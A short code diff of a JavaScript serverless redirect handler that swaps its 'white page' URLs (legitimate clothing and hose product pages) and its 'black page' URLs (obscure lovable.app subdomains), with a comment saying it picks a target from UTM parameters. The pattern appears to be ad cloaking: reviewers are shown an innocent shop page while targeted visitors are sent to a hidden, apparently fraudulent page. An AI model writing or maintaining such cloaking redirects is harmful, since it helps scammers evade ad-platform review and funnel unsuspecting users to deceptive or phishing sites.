@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://hermie.com/en/201801605/tricoflex-ultramax-hose-oe-12.5-mm-15-meters?_gl=1*aovlhj*_up*MQ..*_ga*MjEzMTUzNzgxMS4xNzYxMzE3OTMw*_ga_KVFHXQ4JJP*czE3NjEzMTc5MjkkbzEkZzAkdDE3NjEzMTc5MjkkajYwJGwwJGgw*_ga_QRG887PN7R*czE3NjEzMTc5MjkkbzEkZzAkdDE3NjEzMTc5MjkkajYwJGwwJGg5Njg2Mzc2NTk.*_ga_TFG74JX745*czE3NjEzMTc5MzAkbzEkZzAkdDE3NjEzMTc5MzAkajYwJGwwJGg2NjQxNTUwMTU.";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://www.7forallmankind.eu/eu_en/crew-neck-sweater-cashmere-ink.html";
+    const blackPageURL = "https://wherlnquz.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
